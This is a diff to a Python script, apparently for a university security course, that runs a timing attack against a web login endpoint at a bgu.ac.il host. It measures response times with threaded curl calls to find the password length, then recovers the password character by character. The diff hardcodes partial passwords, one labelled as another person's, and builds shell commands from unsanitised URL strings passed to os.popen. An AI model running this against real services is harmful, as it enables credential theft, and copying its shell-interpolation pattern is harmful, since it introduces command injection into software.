@@ -1,4 +1,5 @@
 import os
+import subprocess
 import logging as log
 from time import time
 import time as timer
@@ -6,7 +7,6 @@ import Configurations
 import urllib.request
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
-
 
 # - - - - - - - - - -  LOG SECTION  - - - - - - - - - -
 
@@ -153,7 +153,7 @@ def run_url(url: str) -> str:
     return ans.read().decode("utf-8")
 
 
-def check_password_size_thread(url: str, iterations: int, thread_number: int, logger) -> float:
+def check_password_size_thread(url_time_command: str, iterations: int, thread_number: int, logger) -> float:
     """
     This function request the given URL iteration times and sum the requests time and return it.
 
@@ -168,25 +168,30 @@ def check_password_size_thread(url: str, iterations: int, thread_number: int, lo
 
     for i in range(iterations):
         # measure time
-        start = time()
-        run_url(url)
-        end = time()
+        # start = time()
+        # run_url(url)
+        # end = time()
+        res = os.popen(url_time_command).read()
+        res_time = float(res)
 
         # insert to dict
-        total_iterations_time += end - start
+        total_iterations_time += res_time
 
         if i % 100 == 0:
-            write_log(logger, f"[check password size thread][thread {thread_number}][iter {i}] result: {total_iterations_time}:")
+            write_log(logger, f"[check password size thread][thread {thread_number}][iter {i}] result: {total_iterations_time}")
 
     return total_iterations_time
 
 
-def check_password_size(start_url: str = "", end_url: str = "",
-                        max_password_size: int = Configurations.default_password_size, logger=None) -> int:
+def warmup():
+    url_time_command = 'curl -s -w "%{time_total}" "http://aoi.ise.bgu.ac.il/?user=test&password=test&difficulty=1"'
+    os.popen(url_time_command)
+
+def check_password_size(start_url: str = "", end_url: str = "", max_password_size: int = Configurations.default_password_size, logger=None) -> int:
     """
     The function uses timing attack (by time gap) the size of the password.
 
-    :param start_url: String. the first part of the URL.
+    :param url: String. the first part of the URL.
     :param end_url: String. the last part of the URL.
     :param max_password_size: String. the first part of the URL.
     :param logger: logger. if not None the function write it action to the given logger.
@@ -195,11 +200,15 @@ def check_password_size(start_url: str = "", end_url: str = "",
     """
     thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)
 
-    future_results = []
+    warmup()
 
+    future_results = []
     for i in range(0, max_password_size + 1, 1):
-        url = f'{start_url}{Configurations.default_character * i}{end_url}'
-        future_results.append(thread_pool.submit(check_password_size_thread, url, Configurations.attempts, i, logger))
+        # url = f'{start_url}{Configurations.default_character * i}{end_url}'
+        url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
+            time_total='time_total', start_url=start_url, password=Configurations.default_character * i, end_url=end_url)
+
+        future_results.append(thread_pool.submit(check_password_size_thread, url_time_command, Configurations.attempts, i, logger))
 
     thread_pool.shutdown(wait=True)
 
@@ -207,16 +216,16 @@ def check_password_size(start_url: str = "", end_url: str = "",
         future_results[i] = future_results[i].result()
 
     password_length_index = future_results.index(max(future_results))
-    write_log(logger, f"[check_password_size]: password length is: {password_length_index}")
 
     return password_length_index
 
 
-def crack_password_thread(url, ch, iterations: int=Configurations.attempts, logger=None):
+def crack_password_thread(url_time_command, url_result_command, ch, current_password, iterations: int=Configurations.attempts, logger=None):
     """
     This function request the given URL iteration times and sum the requests time and return it.
 
-    :param url: String. a full URL
+    :param url_time_command: String. a full URL
+    :param url_result_command:
     :param ch:
     :param iterations:
     :param logger: logger. if not None the function write it action to the given logger.
@@ -226,17 +235,27 @@ def crack_password_thread(url, ch, iterations: int=Configurations.attempts, logg
     total_iterations_time = 0
 
     for i in range(iterations):
-        # measure time
-        start = time()
-        result = run_url(url)
-        end = time()
+        if len(Configurations.password) != 0:
+            break
+        if Configurations.default_character not in current_password:
+            res = os.popen(url_result_command).read()
+            if res == '1':
+                Configurations.password = current_password
+                write_log(logger,
+                          f"[crack password thread] Password is: {current_password}")
+                break
+            write_log(logger,
+                      f"[crack password thread] Password is NOT: {current_password}")
 
-        # insert to dict
-        total_iterations_time += (end - start)
-        if result == '1':
-            raise ValueError(f"FoundPassWord! 'url'.")
-        if i % 1 == 0:
-            write_log(logger, f"[crack password thread][{ch}][iteration {i}] result time: {total_iterations_time}  -  {url}")
+        else:
+            res = os.popen(url_time_command, ).read()
+            res_time = float(res)
+            total_iterations_time += res_time
+            if i % 1 == 0:
+                write_log(logger, f"[crack password thread][{ch}][iteration {i}] result time: {total_iterations_time}  -  {url_result_command}")
+
+        # Configurations.mutex.acquire()
+        # Configurations.mutex.release()
 
     return ch, total_iterations_time
 
@@ -244,23 +263,30 @@ def crack_password_thread(url, ch, iterations: int=Configurations.attempts, logg
 def crack_password(password_size: int, start_url: str = "", end_url: str = "", logger=None):
     """
 
-    :param size:
+    :param password_size:
+    :param start_url:
+    :param end_url:
     :param logger:
     :return:
     """
 
-    password = "izxuwlxfktdnba"
-    password = "izxuwlxfktd"
-    password = ""
+    # password = "loohvrjtcblvniyq"   #aviv password - difficulty 1
+    password = "loohvrjtcblvniy"
+    # password = "i"
 
     for i in range(password_size - len(password)):
-
         thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)
         future_results = []
 
         for ch in Configurations.characters:
-            url = f"{start_url}{password}{ch}{Configurations.default_character * ((password_size - len(password) - 1))}{end_url}"
-            future_results.append(thread_pool.submit(crack_password_thread, url, ch, Configurations.attempts, logger))
+            # url = f"{start_url}{password}{ch}{Configurations.default_character * ((password_size - len(password) - 1))}{end_url}"
+            current_password = f'{password}{ch}{Configurations.default_character * ((password_size - len(password) - 1))}'
+
+            url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
+                time_total='time_total', start_url=start_url, password=current_password, end_url=end_url)
+
+            url_result_command = f'curl -s "{start_url}{current_password}{end_url}"'
+            future_results.append(thread_pool.submit(crack_password_thread, url_time_command, url_result_command, ch, current_password, Configurations.attempts, logger))
 
         thread_pool.shutdown(wait=True)
 
@@ -274,15 +300,12 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
         print(maximum_key, letters_dict[maximum_key])
 
         password += maximum_key
-        write_log(logger, f"[crack password]: iteration {i} got that the chosen letter if: {maximum_key} (current password is '{password}).')")
-
-    write_log(logger, f"[crack password]: password found: {password}   .")
+        write_log(logger, f"[crack password]: iteration {i} got that the chosen letter is: {maximum_key} (current password is '{password}).')")
 
     return password
 
 
-def timing_attack(start_url: str = "", end_url: str = "",
-                  password_size: int = Configurations.default_password_size) -> str:
+def timing_attack(start_url: str = "", end_url: str= "", password_size: int = Configurations.default_password_size) -> str:
     """
     This function get url and password size and return the password by using a time attack.
 
@@ -294,20 +317,19 @@ def timing_attack(start_url: str = "", end_url: str = "",
     """
     logger = set_logger(Configurations.result_path, "crack password")
 
-    size = 15
-    # size = check_password_size(start_url, end_url, password_size, logger)
+    # size = 16
+    size = check_password_size(start_url, end_url, password_size, logger)
 
     if size is None:
         return None
 
     write_log(logger, f"[timing attack]: password with maximal time is in length: {size}.")
-    write_log(logger, f"[timing attack]: starting to lookup password in size {size}.")
 
     plaintext_password = crack_password(password_size=size, start_url=start_url, end_url=end_url, logger=logger)
 
     if plaintext_password is None:
         return None
 
-    write_log(logger, f"password is: {plaintext_password}.")
+    write_log(logger, f"[timing attack] password is: {plaintext_password}.")
 
     return plaintext_password
